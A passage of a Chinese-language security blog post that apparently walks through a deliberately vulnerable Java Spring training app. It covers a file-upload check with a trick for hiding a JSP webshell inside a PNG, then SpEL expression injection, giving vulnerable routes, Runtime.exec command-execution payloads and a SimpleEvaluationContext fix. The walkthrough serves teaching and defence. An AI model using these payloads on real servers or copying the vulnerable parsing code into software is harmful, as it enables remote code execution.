                &quot;text/html&quot;,
                &quot;text/javascript&quot;,
                &quot;application/javascript&quot;,
                &quot;application/ecmascript&quot;,
                &quot;text/xml&quot;,
                &quot;application/xml&quot;
        &#125;;
        for (String blackMimeType : mimeTypeBlackList) &#123;
            // 用contains是为了防止text/html;charset=UTF-8绕过
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;
                logger.error(&quot;[-] Mime type error: &quot; + mimeType);
                deleteFile(filePath);
                return &quot;Upload failed. Illeagl picture.&quot;;
            &#125;
        &#125;

        // 判断文件内容是否是图片 校验3
        boolean isImageFlag = isImage(excelFile);
        deleteFile(randomFilePath);

        if (!isImageFlag) &#123;
            logger.error(&quot;[-] File is not Image&quot;);
            deleteFile(filePath);
            return &quot;Upload failed. Illeagl picture.&quot;;
        &#125;


        try &#123;
            // Get the file and save it somewhere
            byte[] bytes = multifile.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
            Files.write(path, bytes);
        &#125; catch (IOException e) &#123;
            logger.error(e.toString());
            deleteFile(filePath);
            return &quot;Upload failed&quot;;
        &#125;

        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);
        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);
        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);
    &#125;
</code></pre>
<p>判断为图片才允许上传，不过仍可通过其他方式绕过</p>
<pre><code class="bash">copy 1.png/shell.jsp muma.png
</code></pre>
<h2 id="十三、SpEL表达式注入漏洞"><a href="#十三、SpEL表达式注入漏洞" class="headerlink" title="十三、SpEL表达式注入漏洞"></a>十三、SpEL表达式注入漏洞</h2><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能，因为SpEL的功能强大允许在表达式中动态调用方法。</p>
<h3 id="1-路由-x2F-spel-x2F-vuln1"><a href="#1-路由-x2F-spel-x2F-vuln1" class="headerlink" title="1.路由&#x2F;spel&#x2F;vuln1"></a>1.路由&#x2F;spel&#x2F;vuln1</h3><p>漏洞代码：</p>
<pre><code class="Java">   @RequestMapping(&quot;/spel/vuln1&quot;)
    public String spel_vuln1(String value) &#123;
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(value).getValue().toString();
    &#125;
</code></pre>
<p>可以通过spel表达式实现命令执行</p>
<pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009100727504.png" alt="image-20241009100727504"></p>
<h3 id="2-路由-x2F-spel-x2F-vuln2"><a href="#2-路由-x2F-spel-x2F-vuln2" class="headerlink" title="2.路由&#x2F;spel&#x2F;vuln2"></a>2.路由&#x2F;spel&#x2F;vuln2</h3><p>漏洞代码：</p>
<pre><code class="Java">  @RequestMapping(&quot;spel/vuln2&quot;)
    public String spel_vuln2(String value) &#123;
        StandardEvaluationContext context = new StandardEvaluationContext();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);    // trigger vulnerability point
        return x.toString();   // response
    &#125;
</code></pre>
<p>比上面代码多套了一层模板引擎，所以这里要多加个<code>#&#123;&#125;</code>去解析</p>
<pre><code> #&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009102136299.png" alt="image-20241009102136299"></p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复代码：</p>
<pre><code class="Java">  @RequestMapping(&quot;spel/sec&quot;)
    public String spel_sec(String value) &#123;
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);
        return x.toString();
    &#125;
</code></pre>
<p>使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作</p>
<h2 id="十四、Deserialize反序列化"><a href="#十四、Deserialize反序列化" class="headerlink" title="十四、Deserialize反序列化"></a>十四、Deserialize反序列化</h2>
      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
    </div>
</article>





    <div id="comments">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
        <script type="text/javascript">
			(function(d, s) {
				var j, e = d.getElementsByTagName(s)[0];

				if (typeof LivereTower === 'function') { return; }

				j = d.createElement(s);
				window.livereOptions = {
					eagerLoading: true,
					scrollEventTargetSelector: '#post'
                }
				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
				j.async = true;
				e.parentNode.insertBefore(j, e);
			})(document, 'script');
        </script>
        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>
    <!-- City版安装代码已完成 -->
</div>




    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2024 ttycp3
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>


<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
    
        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        
    
        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        
    
        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
    
        
        
    }
    
    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    
    .nav-right nav a.hover > span{
        color: #ffffff !important;
    }
    

    /*列表样式*/
    
    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    
    
    /* 背景图样式 */
    
    #post {
        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
    }
    
    


    /*引用块样式*/
    
    
    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    
    
    
</style>










</html>
